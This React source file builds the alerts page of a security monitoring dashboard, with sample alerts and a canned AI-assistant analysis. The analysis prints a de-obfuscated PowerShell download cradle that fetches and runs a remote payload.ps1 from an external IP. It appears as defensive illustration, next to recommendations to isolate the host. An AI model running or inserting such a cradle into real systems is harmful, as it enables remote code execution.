import React, { useMemo, useState } from 'react';
import {
  ArrowUp,
  ChevronLeft,
  Copy,
  Download,
  Globe,
  History,
  Link2,
  ListFilter,
  MessageSquarePlus,
  RotateCw,
  ThumbsDown,
  ThumbsUp,
  X,
} from 'lucide-react';
import { Checkbox, Select } from '../components/ui/Form.tsx';
import { MonoLabel } from '../components/ui/Panel.tsx';
import { StatusBadge } from '../components/ui/Badge.tsx';
import { cn } from '../lib/cn.ts';
import { severityBg, type Severity } from '../lib/severity.ts';

interface IAlert {
  id: number;
  time: string;
  severity: Severity;
  host: string;
  ip: string;
  title: string;
  status: 'open' | 'investigating' | 'resolved';
}

// Sample alert queue until the alerting API lands
const alerts: IAlert[] = [
  {
    id: 4821,
    time: '2023-10-27 14:32:01',
    severity: 'critical',
    host: 'SV-WIN-SQL-01',
    ip: '192.168.1.105',
    title: 'Obfuscated PowerShell download cradle',
    status: 'open',
  },
  {
    id: 4820,
    time: '2023-10-27 14:31:45',
    severity: 'high',
    host: 'DC-01.corp.local',
    ip: '10.0.0.2',
    title: 'Failed logon burst for service account',
    status: 'open',
  },
  {
    id: 4817,
    time: '2023-10-27 14:12:09',
    severity: 'critical',
    host: 'DB-PROD-01',
    ip: '10.0.5.12',
    title: 'SQL injection pattern returned HTTP 200',
    status: 'investigating',
  },
  {
    id: 4811,
    time: '2023-10-27 13:58:40',
    severity: 'high',
    host: 'WEB-FE-03',
    ip: '10.0.10.33',
    title: 'Web shell written to upload directory',
    status: 'open',
  },
  {
    id: 4802,
    time: '2023-10-27 13:20:12',
    severity: 'medium',
    host: 'WK-FIN-012',
    ip: '192.168.1.88',
    title: 'Scheduled task created by non-admin',
    status: 'open',
  },
  {
    id: 4795,
    time: '2023-10-27 12:44:51',
    severity: 'low',
    host: 'MAC-DEV-JDOE',
    ip: '192.168.2.105',
    title: 'New launch agent registered',
    status: 'resolved',
  },
];

const ALL: Severity[] = ['critical', 'high', 'medium', 'low'];

const AnalysisFor4821: React.FC = () => (
  <div className="space-y-3 text-[13px] leading-5 text-ink">
    <p>
      Based on the event signature and process execution context for{' '}
      <code className="rounded-sm bg-raised px-1 font-mono text-xs">SV-WIN-SQL-01</code>, this
      appears to be a highly obfuscated download cradle.
    </p>
    <p>
      It is attempting to bypass local execution policies and download a payload from an external
      IP:
    </p>
    <span className="inline-flex items-center gap-1.5 rounded-sm border border-critical/50 bg-critical/10 px-2 py-0.5 font-mono text-xs text-critical">
      <Globe className="size-3" /> 185.199.108.153
    </span>
    <p>Here is the de-obfuscated snippet of what ran in memory:</p>
    <div className="overflow-hidden rounded border border-line-strong">
      <div className="flex items-center justify-between border-b border-line-strong bg-raised px-3 py-1.5 font-mono text-[10px] text-muted">
        PowerShell <Copy className="size-3" />
      </div>
      <pre className="overflow-x-auto bg-canvas p-3 font-mono text-[11px] text-ink">
        {`IEX (New-Object Net.WebClient).DownloadString(\n  'http://185.199.108.153:8080/payload.ps1'\n)`}
      </pre>
    </div>
    <p className="font-semibold">Recommendations:</p>
    <ul className="space-y-1.5 pl-3 text-muted">
      <li>
        Isolate the host{' '}
        <code className="rounded-sm bg-raised px-1 font-mono text-xs text-ink">SV-WIN-SQL-01</code>{' '}
        immediately.
      </li>
      <li>Block outbound traffic to the offending IP at the perimeter firewall.</li>
      <li>
        Check{' '}
        <code className="rounded-sm bg-raised px-1 font-mono text-xs text-ink">
          DC-01.corp.local
        </code>{' '}
        for lateral movement indicators, as a failed logon occurred shortly before.
      </li>
    </ul>
  </div>
);

interface IChatMessage {
  role: 'user' | 'assistant';
  content: React.ReactNode;
}

const seedConversation = (alert: IAlert): IChatMessage[] =>
  alert.id === 4821
    ? [
        { role: 'user', content: 'Can you explain what this PowerShell cradle is trying to do?' },
        { role: 'assistant', content: <AnalysisFor4821 /> },
      ]
    : [];

export const Alerts: React.FC = () => {
  const [severities, setSeverities] = useState<Set<Severity>>(new Set(['critical', 'high']));
  const [range, setRange] = useState('Last 24 Hours');
  const [selectedId, setSelectedId] = useState<number | null>(4821);
  const [assistantOpen, setAssistantOpen] = useState(true);
  const [contextAttached, setContextAttached] = useState(true);
  const [conversations, setConversations] = useState<Record<number, IChatMessage[]>>({});
  const [draft, setDraft] = useState('');

  const rows = useMemo(() => alerts.filter((a) => severities.has(a.severity)), [severities]);
  const selected = alerts.find((a) => a.id === selectedId) ?? null;
  const messages = selected ? (conversations[selected.id] ?? seedConversation(selected)) : [];

  const toggleSeverity = (s: Severity) =>
    setSeverities((prev) => {
      const next = new Set(prev);
      if (next.has(s)) next.delete(s);
      else next.add(s);
      return next;
    });

  const send = (e: React.FormEvent) => {
    e.preventDefault();
    if (!selected || !draft.trim()) return;
    setConversations((prev) => ({
      ...prev,
      [selected.id]: [
        ...messages,
        { role: 'user', content: draft.trim() },
        {
          role: 'assistant',
          content: (
            <p className="text-[13px] text-muted">
              The SIEMple AI service isn&apos;t connected in this environment yet, so I can&apos;t
              answer follow-ups. Once the assistant backend is configured, questions here will be
              answered with alert #{selected.id} as context.
            </p>
          ),
        },
      ],
    }));
    setDraft('');
  };

  return (
    <div className="flex h-[calc(100vh-4rem)] min-h-0">
      {/* Query builder */}
      <aside className="w-48 shrink-0 space-y-5 border-r border-line p-4">
        <div className="flex items-center justify-between">
          <MonoLabel className="text-[11px] text-ink">Query builder</MonoLabel>
          <ListFilter className="size-4 text-muted" />
        </div>
        <div className="space-y-2">
          <MonoLabel>Time range</MonoLabel>
          <Select
            value={range}
            onChange={(e) => setRange(e.target.value)}
            className="[&_select]:h-8 [&_select]:text-xs"
          >
            {['Last 1 Hour', 'Last 24 Hours', 'Last 7 Days'].map((r) => (
              <option key={r}>{r}</option>
            ))}
          </Select>
        </div>
        <div className="space-y-2">
          <MonoLabel>Severity</MonoLabel>
          {ALL.map((s) => (
            <Checkbox
              key={s}
              checked={severities.has(s)}
              onChange={() => toggleSeverity(s)}
              label={
                <span className="flex items-center gap-2 text-xs capitalize">
                  <span className={cn('size-1.5 rounded-full', severityBg[s])} /> {s} (
                  {alerts.filter((a) => a.severity === s).length})
                </span>
              }
            />
          ))}
        </div>
      </aside>

      {/* Alert list */}
      <section className="flex w-80 shrink-0 flex-col border-r border-line">
        <header className="flex items-center justify-between border-b border-line px-4 py-3">
          <h1 className="text-lg font-semibold leading-tight text-ink">
            Forensic Events
            <span className="ml-2 font-mono text-[10px] font-normal text-muted">
              {rows.length} results
            </span>
          </h1>
          <button
            type="button"
            className="rounded border border-line-strong p-1.5 text-muted hover:text-ink"
            aria-label="Export"
          >
            <Download className="size-3.5" />
          </button>
        </header>
        <div className="grid grid-cols-[32px_1fr] border-b border-line bg-surface px-4 py-2 font-mono text-[10px] uppercase text-muted">
          <span>Sev</span>
          <span>Alert</span>
        </div>
        <ul className="flex-1 overflow-y-auto">
          {rows.map((a) => (
            <li key={a.id}>
              <button
                type="button"
                onClick={() => setSelectedId(a.id)}
                className={cn(
                  'grid w-full grid-cols-[32px_1fr] items-start border-b border-line px-4 py-3 text-left transition-colors hover:bg-raised/50',
                  selectedId === a.id && 'bg-raised',
                )}
              >
                <span className={cn('mt-1.5 size-2 rounded-full', severityBg[a.severity])} />
                <span className="min-w-0">
                  <span className="block truncate text-sm text-ink">{a.title}</span>
                  <span className="block font-mono text-[11px] text-muted">
                    #{a.id} · {a.time.slice(11)} · {a.host}
                  </span>
                </span>
              </button>
            </li>
          ))}
        </ul>
      </section>

      {/* Alert detail */}
      <section className="min-w-0 flex-1 overflow-y-auto">
        {selected ? (
          <>
            <header className="flex items-center justify-between border-b border-line px-5 py-3">
              <h2 className="flex items-center gap-2 text-lg font-semibold text-ink">
                <span className={cn('size-3 rounded-sm', severityBg[selected.severity])} /> Alert #
                {selected.id}
              </h2>
              <div className="flex items-center gap-3">
                {!assistantOpen && (
                  <button
                    type="button"
                    onClick={() => setAssistantOpen(true)}
                    className="text-xs text-accent hover:underline"
                  >
                    Ask SIEMple AI
                  </button>
                )}
                <button
                  type="button"
                  onClick={() => setSelectedId(null)}
                  className="text-muted hover:text-ink"
                  aria-label="Close alert"
                >
                  <X className="size-4" />
                </button>
              </div>
            </header>
            <div className="space-y-6 p-5">
              <p className="text-sm text-ink">{selected.title}</p>
              <div>
                <MonoLabel>Entity overview</MonoLabel>
                <div className="mt-2 grid grid-cols-2 gap-4 rounded border border-line-strong p-4">
                  <div>
                    <MonoLabel className="text-[9px]">Hostname</MonoLabel>
                    <p className="mt-1 text-ink">{selected.host}</p>
                  </div>
                  <div>
                    <MonoLabel className="text-[9px]">IP address</MonoLabel>
                    <p className="mt-1 text-accent">{selected.ip}</p>
                  </div>
                  <div>
                    <MonoLabel className="text-[9px]">First seen</MonoLabel>
                    <p className="mt-1 font-mono text-xs text-ink">{selected.time} UTC</p>
                  </div>
                  <div>
                    <MonoLabel className="text-[9px]">Status</MonoLabel>
                    <p className="mt-1">
                      <StatusBadge
                        tone={
                          selected.status === 'resolved'
                            ? 'success'
                            : selected.status === 'investigating'
                              ? 'warning'
                              : 'danger'
                        }
                      >
                        {selected.status}
                      </StatusBadge>
                    </p>
                  </div>
                </div>
              </div>
              <div>
                <MonoLabel>Execution graph</MonoLabel>
                <div className="mt-2 flex h-28 items-center justify-center rounded border px-6 text-center border-dashed border-line-strong text-sm text-muted">
                  Process tree renders here once endpoint telemetry is connected
                </div>
              </div>
            </div>
          </>
        ) : (
          <div className="flex h-full items-center justify-center text-sm text-muted">
            Select an alert to investigate.
          </div>
        )}
      </section>

      {/* AI assistant */}
      {assistantOpen && selected && (
        <aside className="flex w-[320px] shrink-0 flex-col border-l border-line bg-surface xl:w-[360px]">
          <header className="flex items-center justify-between border-b border-line px-4 py-3">
            <h2 className="flex items-center gap-1.5 text-base font-semibold text-ink">
              <ChevronLeft className="size-4" /> AI Assistant
            </h2>
            <div className="flex items-center gap-3 text-muted">
              <button
                type="button"
                onClick={() => setConversations((p) => ({ ...p, [selected.id]: [] }))}
                aria-label="New chat"
                className="hover:text-ink"
              >
                <MessageSquarePlus className="size-4" />
              </button>
              <History className="size-4" />
              <button
                type="button"
                onClick={() => setAssistantOpen(false)}
                aria-label="Close assistant"
                className="hover:text-ink"
              >
                <X className="size-4" />
              </button>
            </div>
          </header>
          {contextAttached && (
            <div className="mx-4 mt-3 flex items-center justify-between rounded border border-line-strong bg-canvas px-3 py-1.5 font-mono text-[11px] text-ink">
              <span className="flex items-center gap-2">
                <Link2 className="size-3.5 text-muted" /> Context: Alert #{selected.id} —{' '}
                {selected.host}
              </span>
              <button
                type="button"
                onClick={() => setContextAttached(false)}
                aria-label="Remove context"
                className="text-muted hover:text-ink"
              >
                <X className="size-3" />
              </button>
            </div>
          )}
          <div className="flex-1 space-y-5 overflow-y-auto p-4">
            {messages.length === 0 && (
              <p className="pt-10 text-center text-sm text-muted">
                Ask a question about alert #{selected.id} to start an investigation.
              </p>
            )}
            {messages.map((m, i) =>
              m.role === 'user' ? (
                <div
                  key={i}
                  className="ml-8 rounded-lg border border-line-strong bg-raised px-3 py-2.5 text-sm text-ink"
                >
                  {m.content}
                </div>
              ) : (
                <div key={i} className="space-y-2">
                  <MonoLabel>SIEMple AI</MonoLabel>
                  {m.content}
                  <div className="flex items-center gap-3 pt-1 text-muted">
                    <Copy className="size-3.5" />
                    <ThumbsUp className="size-3.5" />
                    <ThumbsDown className="size-3.5" />
                    <RotateCw className="ml-auto size-3.5" />
                  </div>
                </div>
              ),
            )}
          </div>
          <form onSubmit={send} className="border-t border-line p-3">
            <div className="flex items-center gap-2 rounded border border-line-strong bg-canvas px-3 py-2">
              <input
                value={draft}
                onChange={(e) => setDraft(e.target.value)}
                placeholder="Ask a follow up question..."
                className="flex-1 bg-transparent text-sm text-ink placeholder:text-subtle focus:outline-none"
              />
              <button
                type="submit"
                disabled={!draft.trim()}
                className="flex size-6 items-center justify-center rounded-sm bg-accent text-canvas disabled:opacity-40"
                aria-label="Send"
              >
                <ArrowUp className="size-3.5" />
              </button>
            </div>
            <p className="mt-2 text-center text-[10px] text-subtle">
              AI responses may be inaccurate. Verify before acting on findings.
            </p>
          </form>
        </aside>
      )}
    </div>
  );
};
